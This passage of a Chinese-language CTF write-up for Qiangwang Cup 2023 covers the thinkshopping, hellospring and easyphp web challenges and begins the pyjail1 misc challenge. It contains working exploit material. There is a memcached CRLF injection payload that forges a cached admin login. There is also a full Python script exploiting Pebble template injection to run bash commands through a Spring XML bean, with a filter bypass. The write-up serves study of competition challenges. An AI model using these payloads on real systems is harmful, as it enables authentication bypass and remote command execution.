4%B9%88%E6%89%8D%E8%83%BD%E6%8B%BF%E5%88%B0%E5%91%A2%0D%0A%0D%0A
+</code></pre></div></div>
+<p>然后访问编辑页面即可触发写入 webshell。</p>
+
+<h2 id="thinkshopping">thinkshopping</h2>
+<p>比赛时没有写出，参考其他 writeup 进行复盘：</p>
+<ul>
+  <li><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1702950024&amp;ver=4965&amp;signature=rXSWR*9miRpbF-9myXm8A6FnpOaDzclgYRus5rrfhSVt3OOHMhH76*ppZ8Ix9s*MdhFfxNDEi8x4PAnfqQ8HHP09V*7Y8HtgZCmq7RSw8ofAA5oGcILr2wQSXwUlNL10&amp;new=1">[CTF复现计划]2023强网杯初赛 thinkshop[ping]</a></li>
+  <li><a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh</a></li>
+</ul>
+
+<p>thinkshopping 的环境与 thinkshop 有所不同：</p>
+<ol>
+  <li>移除了 good_edit.html 中反序列化的操作。</li>
+  <li>移除了数据库中的 admin 用户，这导致正常情况下无法登陆。</li>
+  <li>数据库中将 secure-file-priv 置空（thinkshop 中为非 web 目录），因此可以通过 load_file 读取 flag 文件，sql 注入漏洞依然存在，所以只需要登陆后台即可读取 flag。</li>
+</ol>
+
+<p>注意到登陆处配置了 cache，登陆时会尝试从缓存中获取数据。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// 尝试从缓存中获取数据</span>
+    <span class="nv">$adminData</span> <span class="o">=</span> <span class="nc">Db</span><span class="o">::</span><span class="nf">table</span><span class="p">(</span><span class="s1">'admin'</span><span class="p">)</span>
+        <span class="o">-&gt;</span><span class="nf">cache</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span> <span class="nv">$Expire</span><span class="p">)</span>
+        <span class="o">-&gt;</span><span class="nf">find</span><span class="p">(</span><span class="nv">$username</span><span class="p">);</span>
+</code></pre></div></div>
+<p>并且 thinkphp 里配置了 cache 方式为 Memcached，查看 phpinfo 可以判断 memcached 版本为 2.2.0.</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="s1">'cache'</span> <span class="o">=&gt;</span> <span class="p">[</span>
+        <span class="c1">// 驱动方式</span>
+        <span class="s1">'type'</span>   <span class="o">=&gt;</span> <span class="s1">'Memcached'</span><span class="p">,</span>
+        <span class="c1">// 缓存保存目录</span>
+        <span class="s1">'path'</span>   <span class="o">=&gt;</span> <span class="no">CACHE_PATH</span><span class="p">,</span>
+        <span class="c1">// 缓存前缀</span>
+        <span class="s1">'prefix'</span> <span class="o">=&gt;</span> <span class="s1">''</span><span class="p">,</span>
+        <span class="c1">// 缓存有效期 0表示永久缓存</span>
+        <span class="s1">'expire'</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span>
+    <span class="p">],</span>
+</code></pre></div></div>
+<p>参考:<a href="https://www.freebuf.com/vuls/328384.html">php-memcached CRLF绕过 - FreeBuf网络安全行业门户</a> memcached 2.2.0 以下存在 CRLF 漏洞。</p>
+
+<p>poc 如下：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1/test.php?token<span class="o">=</span>TOKEN%00%0D%0Aset%20snowwolf%200%20500%204%0D%0Awolf
+
+<span class="c"># 等价于</span>
+<span class="nb">set </span>snowwolf 0 500 4
+wolf
+</code></pre></div></div>
+<p>memcached 的 set 语法如下:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>key flags exptime bytes <span class="o">[</span>noreply] 
+value 
+</code></pre></div></div>
+<ol>
+  <li>key：用于从Memcached中存储和检索数据的键。</li>
+  <li>flags：服务器与用户提供的数据一起存储的 32 位无符号整数，并在检索项目时与数据一起返回。</li>
+  <li>exptime：以秒为单位的过期时间。0表示没有延迟。如果 exptime 大于30天，Memcached将其用作UNIX时间戳以进行过期。</li>
+  <li>bytes：需要存储的数据块中的字节数。这是存储在 Memcached 中的数据的长度。</li>
+  <li>noreply：这是一个可选参数。它用于通知服务器不发送任何回复。</li>
+  <li>value：需要存储的数据。在执行带有上述选项的命令后，需要在新行上传递数据。</li>
+</ol>
+
+<p>thinkphp 中的 find 函数可以在 thinkphp/library/think/db/Query.php 中找到，如果开启了 cache。查询数据时会获取 <code class="language-plaintext highlighter-rouge">think:shop.admin|username</code> 的值。</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'fetch_sql'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="c1">// 判断查询缓存</span>
+            <span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'cache'</span><span class="p">];</span>
+            <span class="k">if</span> <span class="p">(</span><span class="kc">true</span> <span class="o">===</span> <span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_null</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$key</span> <span class="o">=</span> <span class="s1">'think:'</span> <span class="mf">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">connection</span><span class="o">-&gt;</span><span class="nf">getConfig</span><span class="p">(</span><span class="s1">'database'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="o">?</span> <span class="nb">key</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="o">:</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">'table'</span><span class="p">])</span> <span class="mf">.</span> <span class="s1">'|'</span> <span class="mf">.</span> <span class="nv">$data</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_string</span><span class="p">(</span><span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">]))</span> <span class="p">{</span>
+                <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$cache</span><span class="p">[</span><span class="s1">'key'</span><span class="p">];</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$key</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">connection</span><span class="o">-&gt;</span><span class="nf">getConfig</span><span class="p">(</span><span class="s1">'database'</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'.'</span> <span class="mf">.</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$options</span><span class="p">)</span> <span class="mf">.</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">bind</span><span class="p">));</span>
+            <span class="p">}</span>
+            <span class="nv">$result</span> <span class="o">=</span> <span class="nc">Cache</span><span class="o">::</span><span class="nf">get</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+</code></pre></div></div>
+<p>这个值在 memcached 中的格式可以通过下面的测试代码来获取：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">function</span> <span class="n">test</span><span class="p">(){</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nc">Db</span><span class="o">::</span><span class="nf">query</span><span class="p">(</span><span class="s2">"select * from admin where id=1"</span><span class="p">);</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+    <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"think:shop.admin|admin"</span><span class="p">;</span>
+    <span class="nc">Cache</span><span class="o">::</span><span class="nf">set</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$result</span><span class="p">,</span> <span class="mi">3600</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>运行后可以得到正常的格式：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span><span class="o">:</span><span class="mi">1</span><span class="o">:</span><span class="p">{</span><span class="n">i</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">"id"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"username"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"admin"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">"password"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="s2">"21232f297a57a5a743894a0e4a801fc3"</span><span class="p">;}}</span>
+</code></pre></div></div>
+<p>还有一个需要注意的地方是，memcached 在写入数据时，flag 字段是留给用户自定义的，thinkphp 在写入不同类型的数据时，会设定不同的 flag 值，如 0 表示字符串，4 表示数组，数据库获取到的数据存储到 Memcached 时，使用的 flag 值就是 4。</p>
+
+<p>所以利用 CRLF 写入时，也需要将 flag 值设定为 4，payload 如下：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>think:shop.admin|admin 4 500 101
+a:3:<span class="o">{</span>s:2:<span class="s2">"id"</span><span class="p">;</span>i:1<span class="p">;</span>s:8:<span class="s2">"username"</span><span class="p">;</span>s:5:<span class="s2">"admin"</span><span class="p">;</span>s:8:<span class="s2">"password"</span><span class="p">;</span>s:32:<span class="s2">"21232f297a57a5a743894a0e4a801fc3"</span><span class="p">;</span><span class="o">}</span>
+</code></pre></div></div>
+<p>exp:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="o">%</span><span class="mo">00</span><span class="o">%</span><span class="mi">0</span><span class="nc">D</span><span class="o">%</span><span class="mi">0</span><span class="nc">Aset</span><span class="o">%</span><span class="mi">20</span><span class="n">think</span><span class="o">%</span><span class="mi">3</span><span class="nc">Ashop</span><span class="mf">.</span><span class="n">admin</span><span class="o">%</span><span class="mi">7</span><span class="nc">Cadmin</span><span class="o">%</span><span class="mi">204</span><span class="o">%</span><span class="mi">20500</span><span class="o">%</span><span class="mi">20101</span><span class="o">%</span><span class="mi">0</span><span class="nc">D</span><span class="o">%</span><span class="mi">0</span><span class="nc">Aa</span><span class="o">%</span><span class="mi">3</span><span class="no">A3</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">7</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A2</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">id</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bi</span><span class="o">%</span><span class="mi">3</span><span class="no">A1</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A8</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">username</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A5</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">admin</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A8</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">password</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A32</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">2221232</span><span class="n">f297a57a5a743894a0e4a801fc3</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">B</span><span class="o">%</span><span class="mi">7</span><span class="nc">D</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="n">admin</span>
+</code></pre></div></div>
+
+<h2 id="hellospring">hellospring</h2>
+<p>题目提供了一个使用 pebble 作为渲染引擎的 Spring 服务，pebble 3.1.5 存在模板注入漏洞，参考：- <a href="https://zhuanlan.zhihu.com/p/551576769/">Spring 场景下突破 pebble 模板注入限制 - 知乎</a></p>
+
+<p>文章提供的 payload 可以在本地打通，但目标测试时不会远程加载 xml，猜测不出网，所以可以先将 xml 文件内容写入本地，然后利用 file 协议从本地读取 xml。</p>
+
+<p>另外，测试时发现 xml 是可以写入 /tmp 并且访问到的，但模板却怎么也写不进去。猜测服务端做了某种过滤，一步一步打印出来看是否能够正常加载。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{%</span> <span class="n">set</span> <span class="n">y</span><span class="o">=</span> <span class="n">beans</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory"</span><span class="o">).</span><span class="na">resourceLoader</span><span class="o">.</span><span class="na">classLoader</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="s">"java.beans.Beans"</span><span class="o">)</span> <span class="o">%}</span>
+<span class="o">{%</span> <span class="n">set</span> <span class="n">yy</span> <span class="o">=</span>  <span class="n">beans</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"jacksonObjectMapper"</span><span class="o">).</span><span class="na">readValue</span><span class="o">(</span><span class="s">"{}"</span><span class="o">,</span> <span class="n">y</span><span class="o">)</span> <span class="o">%}</span>
+<span class="o">{{</span> <span class="n">yy</span> <span class="o">}}</span>
+</code></pre></div></div>
+
+<p>当添加了下面这一句就无法正常写入了，猜测是对 org.springframework.context.support.ClassPathXmlApplicationContext 进行了过滤。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{%</span> <span class="n">set</span> <span class="n">yyy</span> <span class="o">=</span> <span class="n">yy</span><span class="o">.</span><span class="na">instantiate</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="s">"org.springframework.context.support.ClassPathXmlApplicationContext"</span><span class="o">)</span> <span class="o">%}</span>
+</code></pre></div></div>
+
+<p>最后发现仅仅是做了一个字符过滤，换为拼接即可绕过：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">"</span><span class="s">org.springframework.context</span><span class="sh">"</span><span class="o">+</span><span class="sh">"</span><span class="s">.support.ClassPathXmlApplicationContext</span><span class="sh">"</span>
+</code></pre></div></div>
+
+<p>exp 如下：</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">datetime</span>
+<span class="kn">import</span> <span class="n">time</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://eci-2zeiuc2hk7njlsvn9mue.cloudeci1.ichunqiu.com:8088</span><span class="sh">"</span>
+<span class="c1"># host = "http://127.0.0.1:8088"
+</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">host</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/uploadFile</span><span class="sh">"</span>
+
+<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">,</span>
+    <span class="sh">"</span><span class="s">https</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">):</span>
+    <span class="n">date_object</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="nf">strptime</span><span class="p">(</span><span class="n">date_string</span><span class="p">,</span> <span class="sh">'</span><span class="s">%a, %d %b %Y %H:%M:%S %Z</span><span class="sh">'</span><span class="p">)</span>
+
+    <span class="n">t</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">date_object</span><span class="p">.</span><span class="nf">strftime</span><span class="p">(</span><span class="sh">'</span><span class="s">%H%M%S</span><span class="sh">'</span><span class="p">))</span>
+    <span class="c1"># t -= 50000
+</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] t: </span><span class="si">{</span><span class="n">t</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">t</span>
+
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">,</span><span class="n">exp</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+    <span class="n">t</span> <span class="o">-=</span> <span class="mi">4</span>
+    <span class="k">if</span> <span class="n">exp</span><span class="p">:</span>
+        <span class="n">loop</span> <span class="o">=</span> <span class="mi">16</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">loop</span> <span class="o">=</span> <span class="mi">100</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">loop</span><span class="p">):</span>
+        <span class="n">file_name</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">file_20231217_</span><span class="si">{</span><span class="nf">str</span><span class="p">(</span><span class="n">t</span><span class="p">).</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span>
+        <span class="n">trigger_url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/?x=</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">trigger_url</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+        <span class="k">if</span> <span class="sh">"</span><span class="s">constructor-arg</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] find exp in /tmp/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+            <span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="s">file:///tmp/</span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="sh">"</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">t</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="k">continue</span>
+        
+
+<span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
+    <span class="n">exp1</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span> <span class="sh">'''</span><span class="s">&lt;?xml version=</span><span class="sh">"</span><span class="s">1.0</span><span class="sh">"</span><span class="s"> encoding=</span><span class="sh">"</span><span class="s">UTF-8</span><span class="sh">"</span><span class="s"> ?&gt;
+    &lt;beans xmlns=</span><span class="sh">"</span><span class="s">http://www.springframework.org/schema/beans</span><span class="sh">"</span><span class="s">
+       xmlns:xsi=</span><span class="sh">"</span><span class="s">http://www.w3.org/2001/XMLSchema-instance</span><span class="sh">"</span><span class="s">
+       xsi:schemaLocation=</span><span class="sh">"</span><span class="s">
+     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd</span><span class="sh">"</span><span class="s">&gt;
+        &lt;bean id=</span><span class="sh">"</span><span class="s">pb</span><span class="sh">"</span><span class="s"> class=</span><span class="sh">"</span><span class="s">java.lang.ProcessBuilder</span><span class="sh">"</span><span class="s"> init-method=</span><span class="sh">"</span><span class="s">start</span><span class="sh">"</span><span class="s">&gt;
+            &lt;constructor-arg &gt;
+            &lt;list&gt;
+                &lt;value&gt;bash&lt;/value&gt;
+                &lt;value&gt;-c&lt;/value&gt;
+                &lt;value&gt;{echo,Y2F0IC9mbGFnID4gL3RtcC8xMjMxMjQucGViYmxl}|{base64,-d}|{bash,-i}&lt;/value&gt;
+            &lt;/list&gt;
+            &lt;/constructor-arg&gt;
+        &lt;/bean&gt;
+    &lt;/beans&gt;
+</span><span class="sh">'''</span>
+    <span class="p">}</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">exp1</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+
+    <span class="n">date_string</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Date</span><span class="sh">'</span><span class="p">]</span>
+    <span class="k">return</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">exp_path</span><span class="p">):</span>
+    <span class="n">exp2</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="sh">"</span><span class="s">content</span><span class="sh">"</span><span class="p">:</span><span class="sh">'''</span><span class="s">{% set y= beans.get(</span><span class="sh">"</span><span class="s">org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory</span><span class="sh">"</span><span class="s">).resourceLoader.classLoader.loadClass(</span><span class="sh">"</span><span class="s">java.beans.Beans</span><span class="sh">"</span><span class="s">) %}
+{% set yy =  beans.get(</span><span class="sh">"</span><span class="s">jacksonObjectMapper</span><span class="sh">"</span><span class="s">).readValue(</span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s">, y) %}
+{% set yyy = yy.instantiate(null,</span><span class="sh">"</span><span class="s">org.springframework.context</span><span class="sh">"</span><span class="s">+</span><span class="sh">"</span><span class="s">.support.ClassPathXmlApplicationContext</span><span class="sh">"</span><span class="s">) %}
+{{ yyy.setConfigLocation(</span><span class="sh">"'''</span> <span class="o">+</span> <span class="n">exp_path</span> <span class="o">+</span> <span class="sh">'''</span><span class="s">.pebble</span><span class="sh">"</span><span class="s">) }}
+{{ yyy.refresh() }}</span><span class="sh">'''</span>
+        <span class="c1"># "content":"111111"
+</span>    <span class="p">}</span>
+
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">exp2</span><span class="p">,</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
+    <span class="n">date_string</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="sh">'</span><span class="s">Date</span><span class="sh">'</span><span class="p">]</span>
+
+    <span class="k">return</span> <span class="nf">calc_time</span><span class="p">(</span><span class="n">date_string</span><span class="p">)</span>
+
+
+<span class="n">t</span> <span class="o">=</span> <span class="nf">upload</span><span class="p">()</span>
+<span class="n">file_path</span> <span class="o">=</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">t</span> <span class="o">=</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
+<span class="nf">trigger</span><span class="p">(</span><span class="n">t</span><span class="p">,</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<ol>
+  <li>exp 中的爆破时间其实没有必要，写入的速度其实比较快。</li>
+  <li>我本地的时区不同，因此加上了 <code class="language-plaintext highlighter-rouge">t -= 50000</code> 这一句。</li>
+</ol>
+
+<h2 id="easyphp">easyphp</h2>
+<p>一个以 xcache 为背景的逆向题：
+解题步骤可参考：<a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh</a></p>
+
+<p>不太很理解这道题的应用场景🤣，正常情况下 xcache 只会在 /tmp 下。</p>
+
+<p>解题思路如下：</p>
+<ol>
+  <li>找出 libphp 基地址，然后根据该地址修复 xcache 文件中的函数指针，使得该文件可以被本地正常加载。</li>
+  <li>加载起来后使用 xdebug trace 日志辅助分析代码运行流程。</li>
+</ol>
+
+<p>记录一下 xcache 环境的搭建过程。</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://xcache.lighttpd.net/pub/Releases/3.2.0/xcache-3.2.0.tar.gz
+<span class="nb">tar </span>zxvf xcache-3.2.0.tar.gz
+<span class="nb">cd </span>xcache-3.2.0
+phpize
+./configure <span class="nt">--enable-xcache</span> <span class="nt">--enable-xcache-encoder</span> <span class="nt">--enable-xcache-decoder</span> <span class="nt">--enable-xcache-assembler</span> <span class="nt">--enable-xcache-disassembler</span> <span class="nt">--with-php-config</span><span class="o">=</span>/usr/bin/php-config
+make &amp; make <span class="nb">install</span>
+</code></pre></div></div>
+<p>但我本地一直没有自动生成该 mmap 文件，手动创建该文件后权限设定为 777，重启后可以生成。</p>
+
+<h1 id="misc">MISC</h1>
+
+<h2 id="pyjail1">pyjail1</h2>
+<p>题目源码如下：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">code</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span>
+<span class="kn">import</span> <span class="n">pty</span>
+<span class="k">def</span> <span class="nf">blacklist_fun_callback</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Player! It</span><span class="sh">'</span><span class="s">s already banned!</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="n">os</span><span class="p">.</span><span class="n">system</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="n">os</span><span class="p">.</span><span class="n">popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="n">subprocess</span><span class="p">.</span><span class="n">call</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="n">code</span><span class="p">.</span><span class="n">interact</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="n">code</span><span class="p">.</span><span class="n">compile_command</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+
+<span class="nb">vars</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="n">attr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="nb">dir</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="nb">getattr</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="k">exec</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="nb">__import__</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="nb">compile</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+<span class="n">breakpoint</span> <span class="o">=</span> <span class="n">blacklist_fun_callback</span>
+
+<span class="k">del</span> <span class="n">os</span><span class="p">,</span> <span class="n">subprocess</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="n">pty</span><span class="p">,</span> <span class="n">blacklist_fun_callback</span>
